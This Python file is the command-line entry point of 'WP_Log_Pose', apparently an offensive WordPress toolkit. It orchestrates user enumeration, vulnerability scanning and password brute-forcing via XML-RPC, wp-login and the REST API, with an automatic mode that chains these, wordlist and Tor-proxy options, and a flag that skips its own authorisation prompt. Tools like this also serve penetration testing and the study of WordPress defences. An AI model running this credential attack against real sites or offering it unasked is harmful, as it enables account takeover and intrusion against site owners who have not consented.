#!/usr/bin/env python3
"""
main.py — WP_Log_Pose entry point.

    cd ~/Downloads
    python3 -m WP_Log_Pose.main enumerate  -u https://target.com
    python3 -m WP_Log_Pose.main vuln       -u https://target.com
    python3 -m WP_Log_Pose.main bruteforce -u https://target.com -w rockyou.txt
    python3 -m WP_Log_Pose.main auto       -u https://target.com -w rockyou.txt
"""
from __future__ import annotations
import argparse, logging, sys
from pathlib import Path
from typing import Any

from .config       import load_config
from .core_http    import is_valid_http_url, normalise_url
from .reporting    import (SUPPORTED_FORMATS, print_banner, print_config_summary,
                           print_findings_summary, print_section, save_results, c, C)
from .base         import Credential
from .enumeration  import UserEnumerator
from .attacks      import XMLRPCAttack, WPLoginAttack, RestAPIAttack
from .vuln_scanner import VulnScanner

VERSION = "2.0.0"


# ── logging ───────────────────────────────────────────────────────────────────
def _setup_logging(v: int) -> None:
    levels = [logging.WARNING, logging.INFO, logging.DEBUG]
    logging.basicConfig(
        level=levels[min(v, 2)],
        format="%(asctime)s  %(levelname)-8s  %(name)s — %(message)s",
        datefmt="%H:%M:%S", stream=sys.stderr,
    )


# ── auth gate ─────────────────────────────────────────────────────────────────
def _confirm(target: str) -> None:
    print(c("\n  ⚠   AUTHORISED TESTING ONLY", C.BOLD, C.YELLOW))
    print(c("  " + "-" * 55, C.DIM))
    print(f"  Target : {c(target, C.CYAN)}\n")
    print(c("  This tool may only be used against systems you own or", C.DIM))
    print(c("  have explicit written permission to test.", C.DIM))
    print(c("  Unauthorised use may violate computer fraud laws.\n", C.DIM))
    try:
        ans = input(c("  Do you have explicit written permission? (yes/no): ", C.WHITE)).strip().lower()
    except (KeyboardInterrupt, EOFError):
        print("\n  Aborted."); sys.exit(0)
    if ans not in {"yes", "y"}:
        print(c("\n  Not confirmed — exiting.\n", C.RED)); sys.exit(0)
    print()


# ── argument parser ───────────────────────────────────────────────────────────
def _parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="python3 -m WP_Log_Pose.main",
        description="WP_Log_Pose — WordPress Advanced Testing Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("command", choices=["enumerate","bruteforce","vuln","auto"],
                   help="Command to run")
    p.add_argument("-u","--url",       required=True, metavar="URL",  help="Target WordPress URL")
    p.add_argument("-w","--wordlist",  metavar="FILE", help="Password wordlist")
    p.add_argument("-U","--usernames", metavar="FILE", help="Username list (one per line)")
    p.add_argument("--output",         metavar="FILE", help="Save results to file")
    p.add_argument("--format", choices=list(SUPPORTED_FORMATS), default="txt",
                   help="Output format (default: txt)")
    p.add_argument("-m","--mode",
                   choices=["xmlrpc","wplogin","restapi","all"], default="all",
                   help="Brute-force mode (default: all)")
    p.add_argument("--threads",  type=int,   default=10,  help="Worker threads (default: 10)")
    p.add_argument("--delay",    type=float, default=0.0, help="Delay between requests (default: 0)")
    p.add_argument("--batch",    type=int,   default=1,   help="XMLRPC batch size (default: 1)")
    p.add_argument("--timeout",  type=int,   default=15,  help="Request timeout seconds (default: 15)")
    p.add_argument("--proxy",    metavar="URL", help="Proxy URL e.g. socks5h://127.0.0.1:9050")
    p.add_argument("--safe",     action="store_true", help="Scan only, no brute-force")
    p.add_argument("--config",   metavar="FILE", help="JSON config file")
    p.add_argument("--no-confirm", action="store_true", help="Skip auth prompt")
    p.add_argument("-v","--verbose", action="count", default=0,
                   help="Verbosity: -v INFO, -vv DEBUG")
    return p


# ── config helpers ────────────────────────────────────────────────────────────
def _merge(base: dict, args: argparse.Namespace) -> dict:
    cfg = dict(base)
    for k, v in {"proxy":args.proxy,"threads":args.threads,"delay":args.delay,
                 "batch":args.batch,"timeout":args.timeout,"output":args.output,
                 "format":args.format,"safe":args.safe or base.get("safe",False)}.items():
        if v is not None: cfg[k] = v
    return cfg

def _load_users(path: str | None) -> list[str]:
    if not path: return []
    p = Path(path)
    if not p.is_file():
        logging.warning("Usernames file not found: %s", path); return []
    with p.open(errors="ignore") as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]

def _slugs(users) -> list[str]:
    seen = set()
    result = []
    for u in users:
        s = u.slug if hasattr(u, "slug") else str(u)
        if s not in seen:
            seen.add(s); result.append(s)
    return result


# ── command handlers ──────────────────────────────────────────────────────────
def _cmd_enumerate(args, config) -> list:
    print_section("User Enumeration", ">>")
    with UserEnumerator(args.url, config, usernames=_load_users(args.usernames)) as e:
        found = e.enumerate_users()
    if not found:
        print(c("  [-]  No users found.", C.DIM)); return []
    print(c(f"\n  [+]  {len(found)} user(s) discovered:\n", C.GREEN, C.BOLD))
    for u in found:
        sources = ", ".join(sorted(u.sources)) if hasattr(u, "sources") else "?"
        print(f"       {c(u.slug if hasattr(u,'slug') else str(u), C.CYAN, C.BOLD)}"
              f"  {c(f'[{sources}]', C.DIM)}")
    out = Path("users.txt")
    out.write_text("\n".join(_slugs(found)) + "\n", encoding="utf-8")
    print(c(f"\n  [+]  Saved -> {out}", C.DIM))
    return found


def _cmd_bruteforce(args, config, usernames: list[str]) -> list[Credential]:
    if not args.wordlist:
        print(c("  [-]  --wordlist required.", C.RED), file=sys.stderr); sys.exit(1)
    if not usernames:
        print(c("  [*]  No usernames supplied — enumerating first...", C.YELLOW))
        with UserEnumerator(args.url, config) as e:
            usernames = _slugs(e.enumerate_users())
        if not usernames:
            print(c("  [-]  No users found.", C.RED)); return []

    creds: list[Credential] = []
    for vec, Cls in [("xmlrpc",XMLRPCAttack),("wplogin",WPLoginAttack),("restapi",RestAPIAttack)]:
        if args.mode not in (vec, "all"): continue
        if creds and args.mode == "all":  break
        print_section(f"Brute-force  [{vec.upper()}]", ">>")
        with Cls(args.url, config, wordlist=args.wordlist, usernames=usernames) as a:
            creds.extend(a.run())
    return creds


def _cmd_vuln(args, config) -> VulnScanner.ScanReport:
    print_section("Vulnerability Scan", ">>")
    with VulnScanner(args.url, config) as s:
        return s.run()


def _detect_vectors(url: str, config: dict) -> dict[str, bool]:
    from .base import WordPressTesterBase
    class _P(WordPressTesterBase):
        def run(self): return []
    vectors: dict[str, bool] = {}
    with _P(url, config) as p:
        r = p._request("POST", f"{url}/xmlrpc.php",
                       data=b'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>',
                       extra_headers={"Content-Type":"text/xml"}, jitter=False)
        vectors["xmlrpc"]  = bool(r and r.status_code == 200 and "<methodResponse>" in r.text)
        r = p._request("GET", f"{url}/wp-json/wp/v2/users", jitter=False)
        vectors["restapi"] = bool(r and r.status_code == 200)
        r = p._request("GET", f"{url}/wp-login.php", jitter=False)
        vectors["wplogin"] = bool(r and r.status_code == 200 and "user_login" in r.text)
    return vectors


def _cmd_auto(args, config, usernames: list[str]) -> list[Credential]:
    if config.get("safe"):
        print(c("  [*]  Safe mode — scan only.", C.YELLOW))
        _cmd_vuln(args, config); return []
    if not args.wordlist:
        print(c("  [-]  --wordlist required.", C.RED), file=sys.stderr); sys.exit(1)

    if not usernames:
        usernames = _slugs(_cmd_enumerate(args, config))
        if not usernames:
            print(c("  [-]  No users found.", C.RED)); return []

    print_section("Vector Detection", ">>")
    vectors = _detect_vectors(args.url, config)
    for v, ok in vectors.items():
        status = c("OK  available",   C.GREEN) if ok else c("XX  unavailable", C.RED)
        print(f"       {c(v.upper()+':', C.BOLD, C.WHITE):<20} {status}")

    for vec, Cls in [("xmlrpc",XMLRPCAttack),("restapi",RestAPIAttack),("wplogin",WPLoginAttack)]:
        if not vectors.get(vec): continue
        print_section(f"Attacking via {vec.upper()}", ">>")
        with Cls(args.url, config, wordlist=args.wordlist, usernames=usernames) as a:
            creds = a.run()
        if creds: return creds
        print(c(f"  [*]  {vec} exhausted — trying next vector...", C.DIM))

    print(c("  [-]  All vectors exhausted.", C.RED)); return []


# ── entry point ───────────────────────────────────────────────────────────────
def main(argv=None) -> int:
    args = _parser().parse_args(argv)
    _setup_logging(args.verbose)

    # Banner always shows
    print_banner(VERSION)

    try:
        args.url = normalise_url(args.url)
        if not is_valid_http_url(args.url):
            raise ValueError(args.url)
    except ValueError as e:
        print(c(f"  [-]  Invalid URL: {e}", C.RED), file=sys.stderr); return 1

    if not args.no_confirm:
        _confirm(args.url)

    config    = _merge(load_config(args.config), args)
    usernames = _load_users(args.usernames)
    print_config_summary(config, args.url, args.command,
                         args.wordlist, args.usernames, len(usernames))

    results: list = []
    exit_code = 0

    try:
        if args.command == "enumerate":
            results.extend(_cmd_enumerate(args, config))

        elif args.command == "bruteforce":
            if config.get("safe"):
                print(c("  [!]  Safe mode — brute-force disabled.", C.YELLOW)); return 0
            creds = _cmd_bruteforce(args, config, usernames)
            results.extend(creds)
            if creds: exit_code = 2

        elif args.command == "vuln":
            report = _cmd_vuln(args, config)
            results.extend(report.findings)

        elif args.command == "auto":
            creds = _cmd_auto(args, config, usernames)
            results.extend(creds)
            if creds: exit_code = 2

    except KeyboardInterrupt:
        print(c("\n\n  [!]  Interrupted by user.", C.YELLOW)); return 130
    except Exception as exc:
        logging.exception("Fatal error in %s", args.command)
        print(c(f"\n  [-]  Fatal error: {exc}", C.RED), file=sys.stderr); return 1

    print_findings_summary(results)

    if results and args.output:
        try:
            saved = save_results(results, args.output,
                                 fmt=config.get("format","txt"), target=args.url)
            print(c(f"  [+]  Results saved -> {saved}\n", C.GREEN))
        except Exception as e:
            logging.error("Save failed: %s", e)
    elif results and not args.output:
        print(c("  [*]  Tip: add --output report.html --format html for a full report.\n", C.DIM))

    return exit_code


if __name__ == "__main__":
    sys.exit(main())
